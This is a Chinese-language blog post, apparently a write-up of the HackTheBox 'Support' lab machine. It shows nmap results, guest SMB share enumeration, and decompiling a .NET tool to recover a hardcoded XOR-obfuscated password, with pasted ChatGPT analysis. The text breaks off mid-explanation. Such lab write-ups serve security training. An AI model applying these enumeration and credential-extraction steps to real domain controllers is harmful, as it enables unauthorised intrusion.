<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- Google Fonts -->
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/cn-fontsource-lxgw-wen-kai-screen-r/font.css">
    <link rel="stylesheet" type="text/css" href="https://fonts.font.im/css?family=Inconsolata:normal,bold">
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习 nmap and other enumnmap12">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox——HTB Support Writeup">
<meta property="og:url" content="https://n0nome.github.io/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/index.html">
<meta property="og:site_name" content="N0nome&#96;s Fucking Life">
<meta property="og:description" content="Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习 nmap and other enumnmap12">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://n0nome.github.io/images/support.png">
<meta property="og:image" content="https://n0nome.github.io/images/support1.png">
<meta property="og:image" content="https://n0nome.github.io/images/support2.png">
<meta property="og:image" content="https://n0nome.github.io/images/support3.png">
<meta property="og:image" content="https://n0nome.github.io/images/support4.png">
<meta property="article:published_time" content="2025-06-19T13:59:05.067Z">
<meta property="article:modified_time" content="2025-06-19T13:59:05.067Z">
<meta property="article:author" content="n0nome">
<meta property="article:tag" content="writeup">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://n0nome.github.io/images/support.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/laojun.jpg">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/laojun.jpg" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/laojun.jpg">
        
      
    
    <!-- title -->
    <title>HackTheBox——HTB Support Writeup</title>
    <!-- async scripts -->
    <!-- Google Analytics -->

  <script async src="https://www.googletagmanager.com/gtag/js?id=G-RXS95XH60B"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-RXS95XH60B');
  </script>


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
    
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
    
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li><!--
     --><!--
       --><li><a href="https://n0nome.github.io/tags/random/">random</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2025/06/19/Planning/HackTheBox%E2%80%94%E2%80%94HTB%20Planning%20Writeup/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Strutted%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Strutted%20Writeup/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://n0nome.github.io/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://n0nome.github.io/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/&text=HackTheBox——HTB Support Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://n0nome.github.io/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/&title=HackTheBox——HTB Support Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://n0nome.github.io/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/&is_video=false&description=HackTheBox——HTB Support Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HackTheBox——HTB Support Writeup&body=Check out this article: https://n0nome.github.io/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://n0nome.github.io/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/&title=HackTheBox——HTB Support Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://n0nome.github.io/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/&title=HackTheBox——HTB Support Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://n0nome.github.io/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/&title=HackTheBox——HTB Support Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://n0nome.github.io/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/&title=HackTheBox——HTB Support Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://n0nome.github.io/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/&name=HackTheBox——HTB Support Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://n0nome.github.io/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/&t=HackTheBox——HTB Support Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>

    

    
      <!-- 如果文章被加密，初始隐藏目录 -->
      <div id="toc" style="">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap-and-other-enum"><span class="toc-number">1.</span> <span class="toc-text">nmap and other enum</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">1.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smb"><span class="toc-number">1.2.</span> <span class="toc-text">smb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dnspy-analyst-exe-and-crack-encrypt-pass-with-chatgpt"><span class="toc-number">1.3.</span> <span class="toc-text">dnspy analyst exe and crack encrypt pass with chatgpt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ldap-enum-info"><span class="toc-number">1.4.</span> <span class="toc-text">ldap enum info</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-support"><span class="toc-number">2.</span> <span class="toc-text">shell as support</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-nt-authority"><span class="toc-number">3.</span> <span class="toc-text">shell as nt authority</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hashes"><span class="toc-number">3.1.</span> <span class="toc-text">hashes</span></a></li></ol></li></ol>
      </div>
     
 </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        HackTheBox——HTB Support Writeup
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">n0nome</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-06-19T13:59:05.067Z" class="dt-published" itemprop="datePublished">2025-06-19</time>
        
        (Updated: <time datetime="2025-06-19T13:59:05.067Z" class="dt-updated" itemprop="dateModified">2025-06-19</time>)
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/writeup/" rel="tag">writeup</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>Welcome to N0nome&#96;s F**king <a href="https://n0nome.github.io/">blog</a>.<br>(:This is just a joke:)<br><a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8uK3T">Do you want to become stronger than me? You just need to move your hands more.</a></p>
<p><code>鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习</code><br><a data-fancybox="gallery" data-src="/images/support.png" data-caption=""><img src="/images/support.png"></a></p>
<h2 id="nmap-and-other-enum"><a href="#nmap-and-other-enum" class="headerlink" title="nmap and other enum"></a>nmap and other enum</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49668/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49701/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49735/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-04-03T02:17:55</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 103.34 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>先加一下hosts</p>
<h3 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb 10.10.11.174 -u guest -p &#x27;&#x27; --shares</span><br><span class="line">SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) </span><br><span class="line">SMB         10.10.11.174    445    DC               [+] support.htb\guest: </span><br><span class="line">SMB         10.10.11.174    445    DC               [*] Enumerated shares</span><br><span class="line">SMB         10.10.11.174    445    DC               Share           Permissions     Remark</span><br><span class="line">SMB         10.10.11.174    445    DC               -----           -----------     ------</span><br><span class="line">SMB         10.10.11.174    445    DC               ADMIN$                          Remote Admin</span><br><span class="line">SMB         10.10.11.174    445    DC               C$                              Default share</span><br><span class="line">SMB         10.10.11.174    445    DC               IPC$            READ            Remote IPC</span><br><span class="line">SMB         10.10.11.174    445    DC               NETLOGON                        Logon server share </span><br><span class="line">SMB         10.10.11.174    445    DC               support-tools   READ            support staff tools</span><br><span class="line">SMB         10.10.11.174    445    DC               SYSVOL                          Logon server share </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>有一个support-tools的共享目录，进去翻一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient \\\\10.10.11.174\\support-tools -U guest</span><br><span class="line">Password for [WORKGROUP\guest]:</span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Thu Jul 21 01:01:06 2022</span><br><span class="line">  ..                                  D        0  Sat May 28 19:18:25 2022</span><br><span class="line">  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 19:19:19 2022</span><br><span class="line">  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 19:19:55 2022</span><br><span class="line">  putty.exe                           A  1273576  Sat May 28 19:20:06 2022</span><br><span class="line">  SysinternalsSuite.zip               A 48102161  Sat May 28 19:19:31 2022</span><br><span class="line">  UserInfo.exe.zip                    A   277499  Thu Jul 21 01:01:07 2022</span><br><span class="line">  windirstat1_1_2_setup.exe           A    79171  Sat May 28 19:20:17 2022</span><br><span class="line">  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 19:19:43 2022</span><br><span class="line"></span><br><span class="line">                4026367 blocks of size 4096. 965578 blocks available</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>啊这，几个都翻一下吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient \\\\10.10.11.174\\IPC$ -U guest    </span><br><span class="line">Password for [WORKGROUP\guest]:</span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">NT_STATUS_NO_SUCH_FILE listing \*</span><br><span class="line">smb: \&gt; exit</span><br><span class="line"></span><br><span class="line">$ smbclient \\\\10.10.11.174\\NETLOGON -U guest</span><br><span class="line">Password for [WORKGROUP\guest]:</span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">NT_STATUS_ACCESS_DENIED listing \*</span><br><span class="line">smb: \&gt; exit</span><br><span class="line"></span><br><span class="line">$ smbclient \\\\10.10.11.174\\SYSVOL -U guest</span><br><span class="line">Password for [WORKGROUP\guest]:</span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">NT_STATUS_ACCESS_DENIED listing \*</span><br><span class="line">smb: \&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>好吧，还是把tools先下载下来看看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient \\\\10.10.11.174\\support-tools -U guest</span><br><span class="line">Password for [WORKGROUP\guest]:</span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Thu Jul 21 01:01:06 2022</span><br><span class="line">  ..                                  D        0  Sat May 28 19:18:25 2022</span><br><span class="line">  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 19:19:19 2022</span><br><span class="line">  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 19:19:55 2022</span><br><span class="line">  putty.exe                           A  1273576  Sat May 28 19:20:06 2022</span><br><span class="line">  SysinternalsSuite.zip               A 48102161  Sat May 28 19:19:31 2022</span><br><span class="line">  UserInfo.exe.zip                    A   277499  Thu Jul 21 01:01:07 2022</span><br><span class="line">  windirstat1_1_2_setup.exe           A    79171  Sat May 28 19:20:17 2022</span><br><span class="line">  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 19:19:43 2022</span><br><span class="line"></span><br><span class="line">                4026367 blocks of size 4096. 965578 blocks available</span><br><span class="line">smb: \&gt; prompt</span><br><span class="line">smb: \&gt; mget *</span><br><span class="line">getting file \7-ZipPortable_21.07.paf.exe of size 2880728 as 7-ZipPortable_21.07.paf.exe (676.7 KiloBytes/sec) (average 676.7 KiloBytes/sec)</span><br><span class="line">getting file \npp.8.4.1.portable.x64.zip of size 5439245 as npp.8.4.1.portable.x64.zip (1247.5 KiloBytes/sec) (average 965.5 KiloBytes/sec)</span><br><span class="line">getting file \putty.exe of size 1273576 as putty.exe (717.7 KiloBytes/sec) (average 923.2 KiloBytes/sec)</span><br><span class="line">getting file \SysinternalsSuite.zip of size 48102161 as SysinternalsSuite.zip (1783.5 KiloBytes/sec) (average 1544.2 KiloBytes/sec)</span><br><span class="line">getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (341.7 KiloBytes/sec) (average 1518.6 KiloBytes/sec)</span><br><span class="line">getting file \windirstat1_1_2_setup.exe of size 79171 as windirstat1_1_2_setup.exe (106.5 KiloBytes/sec) (average 1491.7 KiloBytes/sec)</span><br><span class="line">getting file \WiresharkPortable64_3.6.5.paf.exe of size 44398000 as WiresharkPortable64_3.6.5.paf.exe (2690.8 KiloBytes/sec) (average 1848.7 KiloBytes/sec)</span><br><span class="line">smb: \&gt; exit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这几个文件除了userinfo的那个文件不知道是啥，其他的都可以找到出处</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file UserInfo.exe </span><br><span class="line">UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections</span><br></pre></td></tr></table></figure>
<h3 id="dnspy-analyst-exe-and-crack-encrypt-pass-with-chatgpt"><a href="#dnspy-analyst-exe-and-crack-encrypt-pass-with-chatgpt" class="headerlink" title="dnspy analyst exe and crack encrypt pass with chatgpt"></a>dnspy analyst exe and crack encrypt pass with chatgpt</h3><p>dnspy看一下<br>在<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/73436762/net-decompiler-and-editor-for-linux">stackoverflow</a>上翻到一个dnspy的代替品_<a href="">ILSpy</a><br>好吧，还是回归dnspy</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#如果只把exe文件拿出来运行的话会报错，需要将其他的dll和config文件也放进去才可以正常运行</span><br><span class="line">PS C:\Users\liw\desktop&gt; .\UserInfo.exe</span><br><span class="line"></span><br><span class="line">未经处理的异常:  System.IO.FileNotFoundException: 未能加载文件或程序集“CommandLineParser, Version=0.7.0.0, Culture=neutral, PublicKeyToken=null”或它的某一个依赖项。系统找不到指定的文件。</span><br><span class="line">   在 UserInfo.Program.Main(String[] args)</span><br><span class="line">   在 UserInfo.Program.&lt;Main&gt;(String[] args)</span><br></pre></td></tr></table></figure>
<p>dnspy打开可以看到<br><a data-fancybox="gallery" data-src="/images/support1.png" data-caption=""><img src="/images/support1.png"></a><br><a data-fancybox="gallery" data-src="/images/support2.png" data-caption=""><img src="/images/support2.png"></a><br>这里找到一个password</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Text;</span><br><span class="line"></span><br><span class="line">namespace UserInfo.Services</span><br><span class="line">&#123;</span><br><span class="line">	// Token: 0x02000006 RID: 6</span><br><span class="line">	internal class Protected</span><br><span class="line">	&#123;</span><br><span class="line">		// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318</span><br><span class="line">		public static string getPassword()</span><br><span class="line">		&#123;</span><br><span class="line">			byte[] array = Convert.FromBase64String(Protected.enc_password);</span><br><span class="line">			byte[] array2 = array;</span><br><span class="line">			for (int i = 0; i &lt; array.Length; i++)</span><br><span class="line">			&#123;</span><br><span class="line">				array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);</span><br><span class="line">			&#125;</span><br><span class="line">			return Encoding.Default.GetString(array2);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		// Token: 0x04000005 RID: 5</span><br><span class="line">		private static string enc_password = &quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&quot;;</span><br><span class="line"></span><br><span class="line">		// Token: 0x04000006 RID: 6</span><br><span class="line">		private static byte[] key = Encoding.ASCII.GetBytes(&quot;armando&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个我会吗。不会，哈哈哈，给gpt吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">这个 Protected 类的作用是对一个加密的密码进行解密并返回明文密码。</span><br><span class="line">下面是代码的详细解析：</span><br><span class="line"></span><br><span class="line">1. 代码结构</span><br><span class="line">这个类是 internal，意味着它只能在 UserInfo.Services 命名空间内部使用。</span><br><span class="line"></span><br><span class="line">getPassword() 方法是 static 的，意味着可以直接通过类名调用，不需要实例化对象。</span><br><span class="line"></span><br><span class="line">2. 关键逻辑：Base64 解码</span><br><span class="line">csharp</span><br><span class="line">复制</span><br><span class="line">编辑</span><br><span class="line">byte[] array = Convert.FromBase64String(Protected.enc_password);</span><br><span class="line">Protected.enc_password 是一个 Base64 编码 的字符串，代表一个已加密的密码。</span><br><span class="line"></span><br><span class="line">Convert.FromBase64String(...) 方法会将其解码成字节数组 array，即加密后的字节数据。</span><br><span class="line"></span><br><span class="line">3. 进行解密</span><br><span class="line">csharp</span><br><span class="line">复制</span><br><span class="line">编辑</span><br><span class="line">byte[] array2 = array;</span><br><span class="line">for (int i = 0; i &lt; array.Length; i++)</span><br><span class="line">&#123;</span><br><span class="line">	array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);</span><br><span class="line">&#125;</span><br><span class="line">解密步骤</span><br><span class="line">Protected.key 是一个字节数组，由字符串 &quot;armando&quot; 转换成 ASCII 编码字节数组：</span><br><span class="line"></span><br><span class="line">csharp</span><br><span class="line">复制</span><br><span class="line">编辑</span><br><span class="line">private static byte[] key = 